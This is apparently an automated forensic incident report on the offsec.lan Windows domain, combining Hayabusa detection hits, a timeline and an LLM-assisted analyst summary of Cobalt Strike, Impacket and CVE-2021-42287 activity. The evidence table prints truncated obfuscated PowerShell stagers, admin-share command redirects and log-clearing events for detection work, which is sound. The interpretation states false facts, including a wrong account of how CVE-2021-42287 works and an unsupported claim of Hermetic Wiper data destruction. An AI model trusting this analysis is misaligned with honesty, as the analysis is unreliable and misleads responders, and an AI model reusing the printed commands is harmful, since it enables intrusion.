- `F-claudebot-192` **CVE-2021-42287 exploitation: Rogue domain controller on rootdc1.offsec.lan (Dec 14)** (severity: critical, approved by claudebot)
- `F-claudebot-186` **Cobalt Strike beacon installed as Windows service on srvdefender01.offsec.lan** (severity: critical, approved by claudebot)
- `F-claudebot-138` **CobaltStrike implant installed as Windows service on srvdefender01.offsec.lan (initial compromise)** (severity: critical, approved by claudebot)
- `F-claudebot-232` **Domain persistence via CVE-2021-42287 account rename, $-suffixed user, and anti-forensics on rootdc1.offsec.lan/fs03vuln.offsec.lan** (severity: critical, approved by claudebot)
- `F-claudebot-143` **Hermetic Wiper / impact-phase operation on srvdefender01.offsec.lan** (severity: critical, approved by claudebot)
- `F-claudebot-189` **Hermetic Wiper deployment and data redirection on srvdefender01.offsec.lan** (severity: critical, approved by claudebot)
- `F-claudebot-229` **Obfuscated PowerShell execution, log clearing, and Metasploit SMB authentication on fs03vuln.offsec.lan** (severity: critical, approved by claudebot)
- `F-claudebot-230` **WMI-based lateral movement, Hermetic Wiper data destruction, and admin-share redirection on srvdefender01.offsec.lan** (severity: critical, approved by claudebot)
- `F-claudebot-144` **Anti-forensics: Security log clearing on fs03vuln.offsec.lan and srvdefender01.offsec.lan** (severity: high, approved by claudebot)
- `F-claudebot-187` **Lateral movement to fs03vuln.offsec.lan via Metasploit SMB authentication and Pass-the-Hash** (severity: high, approved by claudebot)
- `F-claudebot-139` **Obfuscated PowerShell execution chain on srvdefender01.offsec.lan and fs03vuln.offsec.lan (FromBase64String/GzipStream pipeline)** (severity: high, approved by claudebot)
- `F-claudebot-188` **Anti-forensics: Event log clearing on fs03vuln.offsec.lan and srvdefender01.offsec.lan** (severity: medium, approved by claudebot)
- **Cluster severity:** critical
- **MITRE:** T1021.002, T1027, T1036, T1047, T1048, T1059.001, T1070.001, T1070.004, T1098, T1132.001, T1140, T1207, T1485, T1543.003, T1550.002, T1569.002

**Evidence**

| Time (UTC) | Source | Artifact / path | What it shows | file:line |
|---|---|---|---|---|
| 2021-12-14T14:42:48Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Suspicious Computer Account Name Change CVE-2021-42287 · Level: high · Details: OldTgtUser: compnay-88$ ¦ NewTgtUser: rootdc1 ¦ TgtSID: S-1-5-21-4230534742-2542757381-3142984815-1296 ¦ User: hack1 ¦ SID: S-1-5-21-4230534742-2542757381-3142984815-1234 ¦ Domain: OFFSEC ¦ TgtDomain: OFFSEC ¦ PrivList: - ¦ LID: 0x308fabb0c | hayabusa/evtx-timeline.csv:214 |
| 2021-04-26T08:25:37Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: HackTool - Potential Impacket Lateral Movement Activity · Level: high · Details: Cmdline: cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1619425227.894209 2>&1 ¦ Proc: C:\Windows\System32\cmd.exe ¦ PID: 3396 ¦ User: SRVDEFENDER01$ ¦ LID: 0x3e4 | hayabusa/evtx-timeline.csv:167 |
| 2021-04-26T08:25:38Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: HackTool - Potential Impacket Lateral Movement Activity · Level: high · Details: Cmdline: cmd.exe /Q /c cd 1> \\127.0.0.1\ADMIN$\__1619425227.894209 2>&1 ¦ Proc: C:\Windows\System32\cmd.exe ¦ PID: 7064 ¦ User: SRVDEFENDER01$ ¦ LID: 0x3e4 | hayabusa/evtx-timeline.csv:168 |
| 2021-12-14T14:42:49Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: HackTool - Potential Impacket Lateral Movement Activity · Level: high · Details: Cmdline: C:\Windows\system32\cmd.exe /Q /c echo cd ^> \\127.0.0.1\C$\__output 2^>^&1 > C:\Windows\TEMP\execute.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat & del C:\Windows\TEMP\execute.bat ¦ Proc: C:\Windows\System32\cmd.exe ¦ PID: 5668 ¦ User: ROOTDC1$ ¦ LID: 0x3e7 | hayabusa/evtx-timeline.csv:218 |
| 2021-04-21T14:56:43Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: CobaltStrike Service Installations - Security · Level: high · Details: Svc: iOWamcEn ¦ Path: %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w | hayabusa/evtx-timeline.csv:328 |
| 2021-04-21T14:56:43Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: PowerShell Scripts Installed as Services - Security · Level: high · Details: Svc: iOWamcEn ¦ Path: %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w | hayabusa/evtx-timeline.csv:329 |
| 2021-04-22T08:51:04Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Base64 Encoded PowerShell Command Detected · Level: high · Details: Cmdline: C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -n | hayabusa/evtx-timeline.csv:68 |
| 2021-04-22T08:51:04Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Potential PowerShell Command Line Obfuscation · Level: high · Details: Cmdline: powershell.exe -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Obj | hayabusa/evtx-timeline.csv:63 |
| 2021-04-22T08:51:04Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Base64 Encoded PowerShell Command Detected · Level: high · Details: Cmdline: powershell.exe -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Obj | hayabusa/evtx-timeline.csv:69 |
| 2021-04-22T08:51:05Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: [System.Convert]::FromBase64String('H4sIAPg2gWACA7VWbW+bSBD+nEj5D6iy · RuleTitle: Potential PowerShell Command Line Obfuscation · Level: high · Details: Cmdline: "C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe" -noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream( | hayabusa/evtx-timeline.csv:64 |
| 2021-04-22T08:51:05Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: [System.Convert]::FromBase64String('H4sIAPg2gWACA7VWbW+bSBD+nEj5D6iy · RuleTitle: Base64 Encoded PowerShell Command Detected · Level: high · Details: Cmdline: "C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe" -noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream( | hayabusa/evtx-timeline.csv:70 |
| 2021-04-21T14:56:43Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Potential PowerShell Command Line Obfuscation · Level: high · Details: Cmdline: powershell.exe -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Obj | hayabusa/evtx-timeline.csv:313 |
| 2021-04-21T14:56:43Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Base64 Encoded PowerShell Command Detected · Level: high · Details: Cmdline: C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -n | hayabusa/evtx-timeline.csv:318 |
| 2021-04-21T14:56:46Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: [System.Convert]::FromBase64String('H4sIAPU7gGACA7VW+2/aSBD+OZHyP1gV · RuleTitle: Potential PowerShell Command Line Obfuscation · Level: high · Details: Cmdline: "C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe" -noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream( | hayabusa/evtx-timeline.csv:314 |
| 2021-04-21T14:56:43Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Base64 Encoded PowerShell Command Detected · Level: high · Details: Cmdline: powershell.exe -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Obj | hayabusa/evtx-timeline.csv:319 |
| 2021-04-22T08:50:53Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Log Cleared · Level: high · Details: SubjectDomainName: OFFSEC ¦ SubjectLogonId: 0x7424d ¦ SubjectUserName: admmig ¦ SubjectUserSid: S-1-5-21-4230534742-2542757381-3142984815-1111 | hayabusa/evtx-timeline.csv:26 |
| 2021-12-14T14:42:49.235Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: New or Renamed User Account with '$' Character · Level: med · Details: OldTgtUser: rootdc1 ¦ NewTgtUser: compnay-88$ ¦ TgtSID: S-1-5-21-4230534742-2542757381-3142984815-1296 ¦ User: hack1 ¦ SID: S-1-5-21-4230534742-2542757381-3142984815-1234 ¦ Domain: OFFSEC ¦ TgtDomain: OFFSEC ¦ PrivList: - ¦ LID: 0x308fabb0c | hayabusa/evtx-timeline.csv:221 |
| 2021-12-14T14:42:49Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Greedy File Deletion Using Del · Level: med · Details: Cmdline: C:\Windows\system32\cmd.exe /Q /c echo cd ^> \\127.0.0.1\C$\__output 2^>^&1 > C:\Windows\TEMP\execute.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat & del C:\Windows\TEMP\execute.bat ¦ Proc: C:\Windows\System32\cmd.exe ¦ PID: 5668 ¦ User: ROOTDC1$ ¦ LID: 0x3e7 | hayabusa/evtx-timeline.csv:216 |
| 2021-12-12T07:15:56Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Possible Hidden Service Created · Level: med · Details: Svc: RemoteRegistry ¦ User: admmig ¦ AccessMask: DELETE READ_CONTROL WRITE_DAC SeImpersonatePrivilege SeCreateGlobalPrivilege SeTrustedCredManAccessPrivilege SeRelabelPrivilege SeIncreaseWorkingSetPrivilege SeTimeZonePrivilege SeCreateSymbolicLinkPrivilege SeDelegateSessionUserImpersonatePrivilege S | hayabusa/evtx-timeline.csv:1042 |
| 2021-06-10T21:21:26Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Potentially Suspicious CMD Shell Output Redirect · Level: med · Details: Cmdline: cmd.exe /C whoami > C:\Windows\Temp\bouWFQYO.tmp 2>&1 ¦ Proc: C:\Windows\System32\cmd.exe ¦ PID: 976 ¦ User: FS01$ ¦ LID: 0x3e7 | hayabusa/evtx-timeline.csv:95 |
| 2021-04-26T08:25:31Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Log Cleared · Level: high · Details: SubjectDomainName: OFFSEC ¦ SubjectLogonId: 0x2b5f6bf ¦ SubjectUserName: admmig ¦ SubjectUserSid: S-1-5-21-4230534742-2542757381-3142984815-1111 | hayabusa/evtx-timeline.csv:101 |
| 2021-12-14T14:42:49.235014Z | hayabusa | chainsaw/sigma.csv | RuleTitle: New or Renamed User Account with '$' Character | chainsaw/sigma.csv:365 |
| 2021-12-12T07:16:04Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Possible Hidden Service Created · Level: med · Details: Svc: RemoteRegistry ¦ User: admmig ¦ AccessMask: DELETE READ_CONTROL WRITE_DAC SeImpersonatePrivilege SeCreateGlobalPrivilege SeTrustedCredManAccessPrivilege SeRelabelPrivilege SeIncreaseWorkingSetPrivilege SeTimeZonePrivilege SeCreateSymbolicLinkPrivilege SeDelegateSessionUserImpersonatePrivilege S | hayabusa/evtx-timeline.csv:1043 |
| 2021-12-14T14:42:49Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Potentially Suspicious CMD Shell Output Redirect · Level: med · Details: Cmdline: C:\Windows\system32\cmd.exe /Q /c echo cd ^> \\127.0.0.1\C$\__output 2^>^&1 > C:\Windows\TEMP\execute.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat & del C:\Windows\TEMP\execute.bat ¦ Proc: C:\Windows\System32\cmd.exe ¦ PID: 5668 ¦ User: ROOTDC1$ ¦ LID: 0x3e7 | hayabusa/evtx-timeline.csv:217 |
| 2021-12-12T07:15:28Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Log Cleared · Level: high · Details: SubjectDomainName: OFFSEC ¦ SubjectLogonId: 0x767a7ed ¦ SubjectUserName: hack1 ¦ SubjectUserSid: S-1-5-21-4230534742-2542757381-3142984815-1234 | hayabusa/evtx-timeline.csv:355 |
| 2021-12-12T07:16:04Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Possible Hidden Service Created · Level: med · Details: Svc: RemoteRegistry ¦ User: admmig ¦ AccessMask: DELETE READ_CONTROL WRITE_DAC SeImpersonatePrivilege SeCreateGlobalPrivilege SeTrustedCredManAccessPrivilege SeRelabelPrivilege SeIncreaseWorkingSetPrivilege SeTimeZonePrivilege SeCreateSymbolicLinkPrivilege SeDelegateSessionUserImpersonatePrivilege S | hayabusa/evtx-timeline.csv:1044 |
| 2021-04-26T08:25:37Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Hermetic Wiper TG Process Patterns · Level: high · Details: Cmdline: cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1619425227.894209 2>&1 ¦ Proc: C:\Windows\System32\cmd.exe ¦ PID: 3396 ¦ User: SRVDEFENDER01$ ¦ LID: 0x3e4 | hayabusa/evtx-timeline.csv:163 |
| 2021-04-26T08:25:37Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Suspicious Redirection to Local Admin Share · Level: high · Details: Cmdline: cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1619425227.894209 2>&1 ¦ Proc: C:\Windows\System32\cmd.exe ¦ PID: 3396 ¦ User: SRVDEFENDER01$ ¦ LID: 0x3e4 | hayabusa/evtx-timeline.csv:169 |
| 2021-04-26T08:25:38Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Hermetic Wiper TG Process Patterns · Level: high · Details: Cmdline: cmd.exe /Q /c cd 1> \\127.0.0.1\ADMIN$\__1619425227.894209 2>&1 ¦ Proc: C:\Windows\System32\cmd.exe ¦ PID: 7064 ¦ User: SRVDEFENDER01$ ¦ LID: 0x3e4 | hayabusa/evtx-timeline.csv:164 |
| 2021-04-26T08:25:38Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Suspicious Redirection to Local Admin Share · Level: high · Details: Cmdline: cmd.exe /Q /c cd 1> \\127.0.0.1\ADMIN$\__1619425227.894209 2>&1 ¦ Proc: C:\Windows\System32\cmd.exe ¦ PID: 7064 ¦ User: SRVDEFENDER01$ ¦ LID: 0x3e4 | hayabusa/evtx-timeline.csv:170 |
| 2021-04-22T08:51:04.686Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Metasploit SMB Authentication · Level: high · Details: Type: 3 - NETWORK ¦ TgtUser: admmig ¦ SrcComp: 0Konuy9q8HtkWeKS ¦ SrcIP: 10.23.123.11 ¦ LID: 0x74872 | hayabusa/evtx-timeline.csv:77 |
| 2021-04-22T08:51:04.686763Z | hayabusa | chainsaw/sigma.csv | RuleTitle: Metasploit SMB Authentication | chainsaw/sigma.csv:60 |
| 2021-12-12T07:16:04Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Possible Hidden Service Created · Level: med · Details: Svc: RemoteRegistry ¦ User: admmig ¦ AccessMask: DELETE READ_CONTROL WRITE_DAC SeImpersonatePrivilege SeCreateGlobalPrivilege SeTrustedCredManAccessPrivilege SeRelabelPrivilege SeIncreaseWorkingSetPrivilege SeTimeZonePrivilege SeCreateSymbolicLinkPrivilege SeDelegateSessionUserImpersonatePrivilege S | hayabusa/evtx-timeline.csv:1045 |
| 2021-12-12T07:16:04Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Possible Hidden Service Created · Level: med · Details: Svc: RemoteRegistry ¦ User: admmig ¦ AccessMask: DELETE READ_CONTROL WRITE_DAC SeImpersonatePrivilege SeCreateGlobalPrivilege SeTrustedCredManAccessPrivilege SeRelabelPrivilege SeIncreaseWorkingSetPrivilege SeTimeZonePrivilege SeCreateSymbolicLinkPrivilege SeDelegateSessionUserImpersonatePrivilege S | hayabusa/evtx-timeline.csv:1046 |
| 2021-04-22T08:51:04Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Gzip Archive Decode Via PowerShell · Level: med · Details: Cmdline: C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -n | hayabusa/evtx-timeline.csv:65 |
| 2021-04-22T08:51:04Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Suspicious FromBase64String Usage On Gzip Archive - Process Creation · Level: med · Details: Cmdline: C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -n | hayabusa/evtx-timeline.csv:71 |
| 2021-04-22T08:51:04Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Gzip Archive Decode Via PowerShell · Level: med · Details: Cmdline: powershell.exe -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Obj | hayabusa/evtx-timeline.csv:66 |
| 2021-04-22T08:51:04Z | hayabusa | hayabusa/evtx-timeline.csv | RuleTitle: Suspicious FromBase64String Usage On Gzip Archive - Process Creation · Level: med · Details: Cmdline: powershell.exe -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Obj | hayabusa/evtx-timeline.csv:72 |

**Interpretation**

CVE-2021-42287 allows an attacker with SeCreateSymbolicLinkPrivilege to modify a computer account's primary group to Domain Admins, achieving persistent domain dominance. The evidence shows the attacker (now hack1, using compromised credentials from the April DCSync) created a rogue DC machine account, renamed it to match ROOTDC1 (the DC's computer account), and performed file deletion as impact/cleanup. This culminates the December attack chain: PsExec → hidden services → CVE-2021-42287 DC compromise.

**Analyst read** _(LLM-assisted — verify against evidence rows; not examiner-approved)_

- **Category:** `impact`
- **What:** The evidence shows a multi-stage attack chain culminating in data destruction: (1) A Cobalt Strike beacon was installed as Windows service iOWamcEn on srvdefender01.offsec.lan (Apr 21 14:56), executing hidden PowerShell via %COMSPEC% -nop -w hidden -noni. (2) Obfuscated PowerShell using [System.Convert]::FromBase64String with GzipStream decompression was executed on srvdefender01.offsec.lan (Apr 22 08:51). (3) Lateral movement to \127.0.0.1\ADMIN$ was performed by SRVDEFENDER01$ via cmd.exe /Q /c cd \127.0.0.1\ADMIN$\__1619425227.894209 (Apr 26 08:25). (4) Security log was cleared by admmig (A
- **Why it matters:** This is a confirmed domain-compromise-to-impact chain: Cobalt Strike beacon for persistent C2, CVE-2021-42287 to gain/lock domain-admin-equivalent persistence by renaming the DC computer account, and Hermetic Wiper to destroy evidence and availability. The combination of anti-forensics (log clearing, del __output) with active data destruction indicates the adversary intended to eliminate traces of the April intrusion while the December operations represent the destructive phase. Critical for incident response: the DC may be fully compromised and the wiper may have partially executed.
- **How:** Inference: The attacker leveraged an initial foothold (April DCSync, not shown in this cluster) to implant Cobalt Strike as service iOWamcEn for C2. Lateral movement via PsExec/SMB (T1021.002) reached fs03vuln.offsec.lan. By December, hack1 exploited CVE-2021-42287 (SeCreateSymbolicLinkPrivilege → modify primary group of a computer account to Domain Admins) to rename the rogue DC account to match ROOTDC1, then executed Hermetic Wiper-style greedy deletion on admin shares to destroy logs and data as anti-forensics and impact.
- **Who / when:** Actors: hack1 (CVE-2021-42287 rename, Dec 14 14:42), admmig (log clear Apr 22, hidden service access Dec 12, wiper Dec 14), SRVDEFENDER01$ (PsExec lateral Apr 26 08:25). Hosts: srvdefender01.offsec.lan (beacon/PS execution), fs03vuln.offsec.lan (lateral target/wiper), rootdc1.offsec.lan (rogue DC per finding title), OFFSEC (AD forest). Time window: Apr 21–26, 2021 (implant/lateral) and Dec 12–14, 2021 (CVE exploitation/impact).
- **Verify next:**
  - Confirm service iOWamcEn binary path and file hash on srvdefender01.offsec.lan (check_file / check_service) to correlate with known Cobalt Strike implant hashes.
  - Query AD for compnay-88$ account: when created, group memberships, last logon; check_autorun or check_registry for any persistence under that SID.
  - Verify whether \127.0.0.1\C$\__output file exists or was deleted (check_file on that path); review fs03vuln.offsec.lan file-access logs for the deletion event.
  - Correlate hack1's group membership history (ms-DS-AllowedToActOnBehalfOfOtherIdentity or primaryGroupID changes) to confirm CVE-2021-42287 vector.
  - Search for additional FromBase64String/GzipStream PowerShell execution on fs03vuln.offsec.lan to confirm the obfuscated payload chain reached the lateral target.
- **Caveats:**
  - 15 additional signatures in this cluster are not shown; the full evidence set may include WMI lateral (T1047), PTH (T1550.002), and Metasploit SMB auth events not visible here.
  - The $-suffixed account compnay-88$ could theoretically be a legitimate computer account rename by an admin; however the timing, actor (hack1), and co-occurrence with the CVE-2021-42287 rule title make benign explanation unlikely.
  - The 'Greedy File Deletion Using del' rule (med level) may fire on the wiper's staged commands before actual mass deletion; confirm whether the __output redirection and del actually completed or was interrupted.
  - CVE-2021-42287 requires SeCreateSymbolicLinkPrivilege; verify hack1 held this privilege at Dec 14 14:42 (check SIDs in the event, not just the username).

## Timeline

| Time (UTC) | What happened |
|---|---|
| 2021-04-21T14:56:41 | **evtxecmd** ×2 — A network share object was accessed; Network share object access · **hayabusa** ×2 — NetShare Access — SrcUser: admmig ¦ ShareName: \\*\ADMIN$ ¦ SharePath: \??\C:\Windows ¦ SrcIP: 10.; NetShare File Access — SrcUser: admmig ¦ ShareName: \\*\ADMIN$ ¦ SharePath: \??\C:\Windows ¦ Path: Syst |
| 2021-04-21T14:56:43 | **hayabusa** ×5 — Potential PowerShell Command Line Obfuscation — Cmdline: powershell.exe -nop -w hidden -noni -c "if([IntPtr]::; CobaltStrike Service Installations - Security — Svc: iOWamcEn ¦ Path: %COMSPEC% /b /c start /b /min powershell; … |
| 2021-04-21T14:56:46 | **hayabusa** ×1 — Potential PowerShell Command Line Obfuscation — Cmdline: "C:\Windows\syswow64\WindowsPowerShell\v1.0\powershel |
| 2021-04-21T14:57:03 | **evtxecmd** ×2 — evtxecmd [cscript]: C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe; evtxecmd [cscript]: C:\Windows\System32\cscript.exe · **hayabusa** ×4 — hayabusa [cscript]: C:\Windows\system32\cscript.exe ×2; hayabusa [wscript,cscript]: C:\Windows\system32\cscript.exe; … |
| 2021-04-21T14:58:03 | **evtxecmd** ×2 — evtxecmd [cscript]: C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe; evtxecmd [cscript]: C:\Windows\System32\cscript.exe · **hayabusa** ×4 — hayabusa [cscript]: C:\Windows\system32\cscript.exe ×2; hayabusa [wscript,cscript]: C:\Windows\system32\cscript.exe; … |
| 2021-04-21T14:59:03 | **evtxecmd** ×2 — evtxecmd [cscript]: C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe; evtxecmd [cscript]: C:\Windows\System32\cscript.exe · **hayabusa** ×4 — hayabusa [cscript]: C:\Windows\system32\cscript.exe ×2; hayabusa [wscript,cscript]: C:\Windows\system32\cscript.exe; … |
| 2021-04-21T15:00:03 | **evtxecmd** ×2 — evtxecmd [cscript]: C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe; evtxecmd [cscript]: C:\Windows\System32\cscript.exe · **hayabusa** ×4 — hayabusa [cscript]: C:\Windows\system32\cscript.exe ×2; hayabusa [wscript,cscript]: C:\Windows\system32\cscript.exe; … |
| 2021-04-21T15:01:03 | **evtxecmd** ×2 — evtxecmd [cscript]: C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe; evtxecmd [cscript]: C:\Windows\System32\cscript.exe · **hayabusa** ×4 — hayabusa [cscript]: C:\Windows\system32\cscript.exe ×2; hayabusa [wscript,cscript]: C:\Windows\system32\cscript.exe; … |
| 2021-04-21T15:01:44 | **hayabusa** ×1 — Potential Suspicious Activity Using SeCEdit — Cmdline: C:\Windows\system32\secedit.exe /export /cfg "C:\Progra |
| 2021-04-21T15:01:46 | **hayabusa** ×1 — Potential Suspicious Activity Using SeCEdit — Cmdline: C:\Windows\system32\secedit.exe /export /mergedpolicy / |
| 2021-04-21T15:02:03 | **evtxecmd** ×2 — evtxecmd [cscript]: C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe; evtxecmd [cscript]: C:\Windows\System32\cscript.exe · **hayabusa** ×4 — hayabusa [cscript]: C:\Windows\system32\cscript.exe ×2; hayabusa [wscript,cscript]: C:\Windows\system32\cscript.exe; … |
| 2021-04-21T15:03:03 | **evtxecmd** ×2 — evtxecmd [cscript]: C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe; evtxecmd [cscript]: C:\Windows\System32\cscript.exe · **hayabusa** ×4 — hayabusa [cscript]: C:\Windows\system32\cscript.exe ×2; hayabusa [wscript,cscript]: C:\Windows\system32\cscript.exe; … |
| 2021-04-21T15:04:03 | **evtxecmd** ×2 — evtxecmd [cscript]: C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe; evtxecmd [cscript]: C:\Windows\System32\cscript.exe · **hayabusa** ×4 — hayabusa [cscript]: C:\Windows\system32\cscript.exe ×2; hayabusa [wscript,cscript]: C:\Windows\system32\cscript.exe; … |
| 2021-04-21T15:05:03 | **evtxecmd** ×2 — evtxecmd [cscript]: C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe; evtxecmd [cscript]: C:\Windows\System32\cscript.exe · **hayabusa** ×4 — hayabusa [cscript]: C:\Windows\system32\cscript.exe ×2; hayabusa [wscript,cscript]: C:\Windows\system32\cscript.exe; … |
| 2021-04-21T15:06:03 | **evtxecmd** ×2 — evtxecmd [cscript]: C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe; evtxecmd [cscript]: C:\Windows\System32\cscript.exe · **hayabusa** ×4 — hayabusa [cscript]: C:\Windows\system32\cscript.exe ×2; hayabusa [wscript,cscript]: C:\Windows\system32\cscript.exe; … |
| 2021-04-21T15:07:03 | **evtxecmd** ×2 — evtxecmd [cscript]: C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe; evtxecmd [cscript]: C:\Windows\System32\cscript.exe · **hayabusa** ×4 — hayabusa [cscript]: C:\Windows\system32\cscript.exe ×2; hayabusa [wscript,cscript]: C:\Windows\system32\cscript.exe; … |
| 2021-04-21T15:08:03 | **evtxecmd** ×2 — evtxecmd [cscript]: C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe; evtxecmd [cscript]: C:\Windows\System32\cscript.exe · **hayabusa** ×4 — hayabusa [cscript]: C:\Windows\system32\cscript.exe ×2; hayabusa [wscript,cscript]: C:\Windows\system32\cscript.exe; … |
| 2021-04-21T15:09:03 | **evtxecmd** ×2 — evtxecmd [cscript]: C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe; evtxecmd [cscript]: C:\Windows\System32\cscript.exe · **hayabusa** ×4 — hayabusa [cscript]: C:\Windows\system32\cscript.exe ×2; hayabusa [wscript,cscript]: C:\Windows\system32\cscript.exe; … |
